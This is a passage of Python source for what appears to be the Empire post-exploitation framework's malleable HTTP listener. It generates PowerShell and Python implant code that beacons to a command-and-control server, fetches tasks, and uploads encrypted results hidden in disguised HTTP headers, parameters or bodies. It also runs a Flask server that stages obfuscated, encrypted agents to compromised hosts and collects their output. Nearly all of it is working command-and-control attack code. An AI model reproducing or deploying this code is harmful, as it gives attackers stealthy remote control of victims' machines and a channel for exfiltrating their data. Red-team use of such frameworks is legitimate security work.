                if profile.get.client.metadata.terminator.type == malleable.Terminator.URIAPPEND:
                    getTask += "$taskURI += $RoutingPacket;"

                # ==== ADD HEADERS ====
                for header, value in profile.get.client.headers.items():
                    getTask += "$"+vWc+".Headers.Add('"+header+"', '"+value+"');"
                if profile.get.client.metadata.terminator.type == malleable.Terminator.HEADER:
                    getTask += "$"+vWc+".Headers.Add('"+profile.get.client.metadata.terminator.arg+"', $RoutingPacket);"

                # ==== ADD BODY ====
                if profile.get.client.metadata.terminator.type == malleable.Terminator.PRINT:
                    getTask += "$body = $RoutingPacket;"
                else:
                    getTask += "$body = '"+profile.get.client.body+"';"

                # ==== SEND REQUEST ====
                if profile.get.client.verb.lower() != "get" or profile.get.client.body or profile.get.client.metadata.terminator.type == malleable.Terminator.PRINT:
                    getTask += "$result = $"+vWc+".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"+ profile.get.client.verb +"', [System.Text.Encoding]::Default.GetBytes('"+ profile.get.client.body +"'));"
                else:
                    getTask += "$result = $"+vWc+".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"

                # ==== EXTRACT RESULTS ====
                if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
                    getTask += "$data = $"+vWc+".responseHeaders.get('"+profile.get.server.output.terminator.arg+"');"
                    getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"

                elif profile.get.server.output.terminator.type == malleable.Terminator.PRINT:
                    getTask += "$data = $result;"
                    getTask += "$data = [System.Text.Encoding]::Default.GetString($data);"

                # ==== INTERPRET RESULTS ====
                getTask += profile.get.server.output.generate_powershell_r("$data")
                getTask += "$data = [System.Text.Encoding]::Default.GetBytes($data);"

                # ==== RETURN RESULTS ====
                getTask += "$data;"
                getTask += "}"

                # ==== HANDLE ERROR ====
                getTask += "} catch [Net.WebException] {"
                getTask += "$script:MissedCheckins += 1;"
                getTask += "if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {"
                getTask += "Start-Negotiate -S '$ser' -SK $SK -UA $ua;"
                getTask += "}"
                getTask += "}"
                getTask += "};"

                # ==== DEFINE POST ====
                sendMessage = "$script:SendMessage = {"
                sendMessage += "param($Packets);"
                sendMessage += "if ($Packets) {"

                # note: id container not used, only output

                # ==== BUILD ROUTING PACKET ====
                # meta 'RESULT_POST' : 5
                sendMessage += "$EncBytes = Encrypt-Bytes $Packets;"
                sendMessage += "$RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;"
                sendMessage += "$RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);"

                sendMessage += profile.post.client.output.generate_powershell("$RoutingPacket")

                # ==== BUILD REQUEST ====
                sendMessage += "if ($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {"
                sendMessage += "$"+vWc+" = New-Object System.Net.WebClient;"

                # ==== CONFIGURE PROXY ====
                sendMessage += "$"+vWc+".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();"
                sendMessage += "$"+vWc+".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;"
                sendMessage += "if ($Script:Proxy) {"
                sendMessage += "$"+vWc+".Proxy = $Script:Proxy;"
                sendMessage += "}"

                # ==== CHOOSE URI ====
                sendMessage += "$taskURI = " + ",".join(["'%s'" % u for u in (profile.post.client.uris if profile.post.client.uris else ["/"])]) + " | Get-Random;"

                # ==== ADD PARAMETERS ====
                first = True
                for parameter, value in profile.post.client.parameters.items():
                    sendMessage += "$taskURI += '"+("?" if first else "&")+"';"
                    first = False
                    sendMessage += "$taskURI += '"+parameter+"="+value+"';"
                if profile.post.client.output.terminator.type == malleable.Terminator.PARAMETER:
                    sendMessage += "$taskURI += '"+("?" if first else "&")+"';"
                    first = False
                    sendMessage += "$taskURI += '"+profile.post.client.output.terminator.arg+"=' + $RoutingPacket;"

                if profile.post.client.output.terminator.type == malleable.Terminator.URIAPPEND:
                    sendMessage += "$taskURI += $RoutingPacket;"

                # ==== ADD HEADERS ====
                for header, value in profile.post.client.headers.items():
                    sendMessage += "$"+vWc+".Headers.Add('"+header+"', '"+value+"');"
                if profile.post.client.output.terminator.type == malleable.Terminator.HEADER:
                    sendMessage += "$"+vWc+".Headers.Add('"+profile.post.client.output.terminator.arg+"', $RoutingPacket);"

                # ==== ADD BODY ====
                if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                    sendMessage += "$body = $RoutingPacket;"
                else:
                    sendMessage += "$body = '"+profile.post.client.body+"';"

                # ==== SEND REQUEST ====
                sendMessage += "try {"
                if profile.post.client.verb.lower() != "get" or profile.post.client.body or profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                    sendMessage += "$result = $"+vWc+".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"+ profile.post.client.verb.upper() +"', [System.Text.Encoding]::Default.GetBytes($body));"
                else:
                    sendMessage += "$result = $"+vWc+".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"

                # ==== HANDLE ERROR ====
                sendMessage += "} catch [System.Net.WebException] {"
                sendMessage += "if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {"
                sendMessage += "Start-Negotiate -S '$ser' -SK $SK -UA $ua;"
                sendMessage += "}"
                sendMessage += "}"
                sendMessage += "}"
                sendMessage += "}"
                sendMessage += "};"

                return updateServers + getTask + sendMessage


            elif language.lower() == 'python':
                # Python

                updateServers = "server = '%s'\n" % (host)

                # ==== HANDLE SSL ====
                if host.startswith("https"):
                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None\n"

                sendMessage = "def send_message(packets=None):\n"
                sendMessage += "    global missedCheckins\n"
                sendMessage += "    global server\n"
                sendMessage += "    global headers\n"
                sendMessage += "    global taskURIs\n"

                sendMessage += "    vreq = type('vreq', (urllib.request.Request, object), {'get_method':lambda self:self.verb if (hasattr(self, 'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"

                # ==== BUILD POST ====
                sendMessage += "    if packets:\n"

                # ==== BUILD ROUTING PACKET ====
                sendMessage += "        encData = aes_encrypt_then_hmac(key, packets)\n"
                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)\n"
                sendMessage += "\n".join(["        " + _ for _ in profile.post.client.output.generate_python("routingPacket").split("\n")]) + "\n"

                # ==== CHOOSE URI ====
                sendMessage += "        taskUri = random.sample("+ str(profile.post.client.uris) +", 1)[0]\n"
                sendMessage += "        requestUri = server + taskUri\n"

                # ==== ADD PARAMETERS ====
                sendMessage += "        parameters = {}\n"
                for parameter, value in profile.post.client.parameters.items():
                    sendMessage += "        parameters['"+parameter+"'] = '"+value+"'\n"
                if profile.post.client.output.terminator.type == malleable.Terminator.PARAMETER:
                    sendMessage += "        parameters['"+profile.post.client.output.terminator.arg+"'] = routingPacket\n"
                sendMessage += "        if parameters:\n"
                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"

                if profile.post.client.output.terminator.type == malleable.Terminator.URIAPPEND:
                    sendMessage += "        requestUri += routingPacket\n"

                # ==== ADD BODY ====
                if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                    sendMessage += "        body = routingPacket\n"
                else:
                    sendMessage += "        body = '"+profile.post.client.body+"'\n"
                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"

                # ==== BUILD REQUEST ====
                sendMessage += "        req = vreq(requestUri, body)\n"
                sendMessage += "        req.verb = '"+profile.post.client.verb+"'\n"

                # ==== ADD HEADERS ====
                for header, value in profile.post.client.headers.items():
                    sendMessage += "        req.add_header('"+header+"', '"+value+"')\n"
                if profile.post.client.output.terminator.type == malleable.Terminator.HEADER:
                    sendMessage += "        req.add_header('"+profile.post.client.output.terminator.arg+"', routingPacket)\n"

                # ==== BUILD GET ====
                sendMessage += "    else:\n"

                # ==== BUILD ROUTING PACKET
                sendMessage += "        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)\n"
                sendMessage += "\n".join(["        " + _ for _ in profile.get.client.metadata.generate_python("routingPacket").split("\n")]) + "\n"

                # ==== CHOOSE URI ====
                sendMessage += "        taskUri = random.sample("+ str(profile.get.client.uris) +", 1)[0]\n"
                sendMessage += "        requestUri = server + taskUri\n"

                # ==== ADD PARAMETERS ====
                sendMessage += "        parameters = {}\n"
                for parameter, value in profile.get.client.parameters.items():
                    sendMessage += "        parameters['"+parameter+"'] = '"+value+"'\n"
                if profile.get.client.metadata.terminator.type == malleable.Terminator.PARAMETER:
                    sendMessage += "        parameters['"+profile.get.client.metadata.terminator.arg+"'] = routingPacket\n"
                sendMessage += "        if parameters:\n"
                sendMessage += "            requestUri += '?' + urllib.parse.urlencode(parameters)\n"

                if profile.get.client.metadata.terminator.type == malleable.Terminator.URIAPPEND:
                    sendMessage += "        requestUri += routingPacket\n"

                # ==== ADD BODY ====
                if profile.get.client.metadata.terminator.type == malleable.Terminator.PRINT:
                    sendMessage += "        body = routingPacket\n"
                else:
                    sendMessage += "        body = '"+profile.get.client.body+"'\n"
                sendMessage += "        try:\n            body=body.encode()\n        except AttributeError:\n            pass\n"

                # ==== BUILD REQUEST ====
                sendMessage += "        req = vreq(requestUri, body)\n"
                sendMessage += "        req.verb = '"+profile.get.client.verb+"'\n"

                # ==== ADD HEADERS ====
                for header, value in profile.get.client.headers.items():
                    sendMessage += "        req.add_header('"+header+"', '"+value+"')\n"
                if profile.get.client.metadata.terminator.type == malleable.Terminator.HEADER:
                    sendMessage += "        req.add_header('"+profile.get.client.metadata.terminator.arg+"', routingPacket)\n"

                # ==== SEND REQUEST ====
                sendMessage += "    try:\n"
                sendMessage += "        res = urllib.request.urlopen(req)\n"

                # ==== EXTRACT RESPONSE ====
                if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
                    header = profile.get.server.output.terminator.arg
                    sendMessage += "        data = res.info().dict['"+header+"'] if '"+header+"' in res.info().dict else ''\n"
                    sendMessage += "        data = urllib.parse.unquote(data)\n"
                elif profile.get.server.output.terminator.type == malleable.Terminator.PRINT:
                    sendMessage += "        data = res.read()\n"

                # ==== DECODE RESPONSE ====
                sendMessage += "\n".join(["        " + _ for _ in profile.get.server.output.generate_python_r("data").split("\n")]) + "\n"
                # before return we encode to bytes, since in some transformations "join" produces str
                sendMessage += "        if isinstance(data,str): data = data.encode('latin-1')\n"
                sendMessage += "        return ('200', data)\n"

                # ==== HANDLE ERROR ====
                sendMessage += "    except urllib.request.HTTPError as HTTPError:\n"
                sendMessage += "        missedCheckins += 1\n"
                sendMessage += "        if HTTPError.code == 401:\n"
                sendMessage += "            sys.exit(0)\n"
                sendMessage += "        return (HTTPError.code, '')\n"
                sendMessage += "    except urllib.request.URLError as URLError:\n"
                sendMessage += "        missedCheckins += 1\n"
                sendMessage += "        return (URLError.reason, '')\n"

                sendMessage += "    return ('', '')\n"

                return updateServers + sendMessage

            else:
                print(helpers.color("[!] listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."))
        else:
            print(helpers.color('[!] listeners/template generate_comms(): no language specified!'))

    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # extract the set options for this instantiated listener
        bindIP = listenerOptions['BindIP']['Value']
        port = listenerOptions['Port']['Value']
        host = listenerOptions['Host']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        listenerName = listenerOptions['Name']['Value']
        proxy = listenerOptions['Proxy']['Value']
        proxyCreds = listenerOptions['ProxyCreds']['Value']
        certPath = listenerOptions['CertPath']['Value']

        # build and validate profile
        profile = malleable.Profile._deserialize(listenerOptions["ProfileSerialized"]["Value"])
        profile.validate()

        # suppress the normal Flask output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        # initialize flask server
        app = Flask(__name__)
        self.app = app

        @app.route('/', methods=["GET", "POST"])
        @app.route('/<path:request_uri>', methods=["GET", "POST"])
        def handle_request(request_uri="", tempListenerOptions=None):
            """
            Handle an agent request.
            """
            data = request.get_data()
            clientIP = request.remote_addr
            url = request.url
            method = request.method
            headers = request.headers
            profile = malleable.Profile._deserialize(self.options["ProfileSerialized"]["Value"])

            # log request
            listenerName = self.options['Name']['Value']
            message = "[*] {} request for {}/{} from {} ({} bytes)".format(request.method.upper(), request.host, request_uri, clientIP, len(request.data))
            signal = json.dumps({
                'print': False,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

            try:
                # build malleable request from flask request
                malleableRequest = malleable.MalleableRequest()
                malleableRequest.url = url
                malleableRequest.verb = method
                malleableRequest.headers = headers
                malleableRequest.body = data

                # fix non-ascii characters
                if '%' in malleableRequest.path:
                    malleableRequest.path = urllib.parse.unquote(malleableRequest.path)

                # identify the implementation by uri
                implementation = None
                for uri in sorted((profile.stager.client.uris if profile.stager.client.uris else ["/"]) + (profile.get.client.uris if profile.get.client.uris else ["/"]) + (profile.post.client.uris if profile.post.client.uris else ["/"]), key=len, reverse=True):
                    if request_uri.startswith(uri.lstrip("/")):
                        # match!
                        for imp in [profile.stager, profile.get, profile.post]:
                            if uri in (imp.client.uris if imp.client.uris else ["/"]):
                                implementation = imp
                                break
                        if implementation: break

                # attempt to extract information from the request
                if implementation:
                    agentInfo = None
                    if implementation is profile.stager and request.method == "POST":
                        # stage 1 negotiation comms are hard coded, so we can't use malleable
                        agentInfo = malleableRequest.body
                    elif implementation is profile.post:
                        # the post implementation has two spots for data, requires two-part extraction
                        agentInfo, output = implementation.extract_client(malleableRequest)
                        agentInfo = (agentInfo if agentInfo else b"") + (output if output else b"")
                    else:
                        agentInfo = implementation.extract_client(malleableRequest)
                    if agentInfo:
                        dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, agentInfo, listenerOptions, clientIP)
                        if dataResults and len(dataResults) > 0:
                            for (language, results) in dataResults:
                                if results:
                                    if isinstance(results, str):
                                        results = results.encode("latin-1")
                                    if results == b'STAGE0':
                                        # step 2 of negotiation -> server returns stager (stage 1)

                                        # log event
                                        message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
                                        signal = json.dumps({
                                            'print': True,
                                            'message': message
                                        })
                                        dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                                        # build stager (stage 1)
                                        stager = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)

                                        # build malleable response with stager (stage 1)
                                        malleableResponse = implementation.construct_server(stager)
                                        return Response(malleableResponse.body, malleableResponse.code, malleableResponse.headers)

                                    elif results.startswith(b'STAGE2'):
                                        # step 6 of negotiation -> server sends patched agent (stage 2)

                                        if ':' in clientIP:
                                            clientIP = '[' + clientIP + ']'
                                        sessionID = results.split(b' ')[1].strip().decode('UTF-8')
                                        sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']

                                        # log event
                                        message = "[*] Sending agent (stage 2) to {} at {}".format(sessionID, clientIP)
                                        signal = json.dumps({
                                            'print': True,
                                            'message': message
                                        })
                                        dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                                        # TODO: handle this with malleable??
                                        tempListenerOptions = None
                                        if "Hop-Name" in request.headers:
                                            hopListenerName = request.headers.get('Hop-Name')
                                            if hopListenerName:
                                                try:
                                                    hopListener = data_util.get_listener_options(hopListenerName)
                                                    tempListenerOptions = copy.deepcopy(listenerOptions)
                                                    tempListenerOptions['Host']['Value'] = hopListener['Host']['Value']
                                                except TypeError:
                                                    tempListenerOptions = listenerOptions

                                        session_info = Session().query(models.Agent).filter(
                                            models.Agent.session_id == sessionID).first()
                                        if session_info.language == 'ironpython':
                                            version = 'ironpython'
                                        else:
                                            version = ''

                                        # generate agent
                                        agentCode = self.generate_agent(language=language,
                                                                        listenerOptions=(tempListenerOptions if tempListenerOptions else listenerOptions),
                                                                        obfuscate=self.mainMenu.obfuscate,
                                                                        obfuscationCommand=self.mainMenu.obfuscateCommand,
                                                                        version=version)
                                        encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)

                                        # build malleable response with agent
                                        # note: stage1 comms are hard coded, can't use malleable here.
                                        return Response(encryptedAgent, 200, implementation.server.headers)

                                    elif results[:10].lower().startswith(b'error') or results[:10].lower().startswith(b'exception'):
                                        # agent returned an error
                                        message = "[!] Error returned for results by {} : {}".format(clientIP, results)
                                        signal = json.dumps({
                                            'print': True,
                                            'message': message
                                        })
                                        dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                                        return Response(self.default_response(), 404)

                                    elif results.startswith(b'ERROR:'):
                                        # error parsing agent data
                                        message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(request_uri, clientIP, results)
                                        signal = json.dumps({
                                            'print': True,
                                            'message': message
                                        })
                                        dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                                        if b'not in cache' in results:
                                            # signal the client to restage
                                            print(helpers.color("[*] Orphaned agent from %s, signaling restaging" % (clientIP)))
                                            return make_response("", 401)

                                        return Response(self.default_response(), 404)

                                    elif results == b'VALID':
                                        # agent posted results
                                        message = "[*] Valid results returned by {}".format(clientIP)
                                        signal = json.dumps({
                                            'print': False,
                                            'message': message
                                        })
                                        dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))

                                        malleableResponse = implementation.construct_server("")
                                        return Response(malleableResponse.body, malleableResponse.code, malleableResponse.headers)

                                    else:
                                        if request.method == b"POST":
                                            # step 4 of negotiation -> server returns RSA(nonce+AESsession))

                                            # log event
                                            message = "[*] Sending session key to {}".format(clientIP)
                                            signal = json.dumps({
                                                'print': True,
                                                'message': message
                                            })
                                            dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                                            # note: stage 1 negotiation comms are hard coded, so we can't use malleable
                                            return Response(results, 200, implementation.server.headers)

                                        else:
                                            # agent requested taskings
                                            message = "[*] Agent from {} retrieved taskings".format(clientIP)
                                            signal = json.dumps({
                                                'print': False,
                                                'message': message
                                            })
                                            dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                                            # build malleable response with results
                                            malleableResponse = implementation.construct_server(results)
                                            if isinstance(malleableResponse.body, str):
                                                malleableResponse.body = malleableResponse.body.encode('latin-1')
                                            return Response(malleableResponse.body, malleableResponse.code, malleableResponse.headers)

                                else:
                                    # no tasking for agent
                                    message = "[*] Agent from {} retrieved taskings".format(clientIP)
                                    signal = json.dumps({
                                        'print': False,
                                        'message': message
                                    })
                                    dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                                    # build malleable response with no results
                                    malleableResponse = implementation.construct_server(results)
                                    return Response(malleableResponse.body, malleableResponse.code, malleableResponse.headers)
                        else:
                            # log error parsing routing packet
                            message = "[!] Error parsing routing packet from {}: {}.".format(clientIP, str(agentInfo))
                            signal = json.dumps({
                                'print': True,
                                'message': message
                            })
                            dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                    # log invalid request
                    message = "[!] /{} requested by {} with no routing packet.".format(request_uri, clientIP)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

                else:
                    # log invalid uri
                    message = "[!] unknown uri /{} requested by {}.".format(request_uri, clientIP)
                    signal = json.dumps({
                        'print': True,
                        'message': message
                    })
                    dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

            except malleable.MalleableError as e:
                # probably an issue with the malleable library, please report it :)
                message = "[!] Malleable had trouble handling a request for /{} by {}: {}.".format(request_uri, clientIP, str(e))
                signal = json.dumps({
                    'print': True,
                    'message': message
                })

            return Response(self.default_response(), 200)

        try:
            if host.startswith('https'):
                if certPath.strip() == '' or not os.path.isdir(certPath):
                    print(helpers.color("[!] Unable to find certpath %s, using default." % certPath))
                    certPath = "setup"
                certPath = os.path.abspath(certPath)
                pyversion = sys.version_info

                # support any version of tls
                if pyversion[0] == 2 and pyversion[1] == 7 and pyversion[2] >= 13:
                    proto = ssl.PROTOCOL_TLS
                elif pyversion[0] >= 3:
                    proto = ssl.PROTOCOL_TLS
                else:
                    proto = ssl.PROTOCOL_SSLv23

                context = ssl.SSLContext(proto)
                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key" % (certPath))
                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
            else:
                app.run(host=bindIP, port=int(port), threaded=True)
        except Exception as e:
            print(helpers.color("[!] Listener startup on port %s failed - %s: %s" % (port, e.__class__.__name__, str(e))))
            message = "[!] Listener startup on port {} failed - {}: {}".format(port, e.__class__.__name__, str(e))
            signal = json.dumps({
                'print': True,
                'message': message
            })
            dispatcher.send(signal, sender="listeners/http_malleable/{}".format(listenerName))

    def start(self, name=''):
        """
        Start a threaded instance of self.start_server() and store it in
        the self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != '':
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions['Name']['Value']
            self.threads[name] = helpers.KThread(target=self.start_server, args=(listenerOptions,))
            self.threads[name].start()
            time.sleep(1)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

    def shutdown(self, name=''):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != '':
            print(helpers.color("[!] Killing listener '%s'" % (name)))
            self.threads[name].kill()
        else:
            print(helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value'])))
            self.threads[self.options['Name']['Value']].kill()

    def generate_cookie(self):
        """
        Generate Cookie
        """

        chars = string.ascii_letters
        cookie = helpers.random_string(random.randint(6,16), charset=chars)

        return cookie
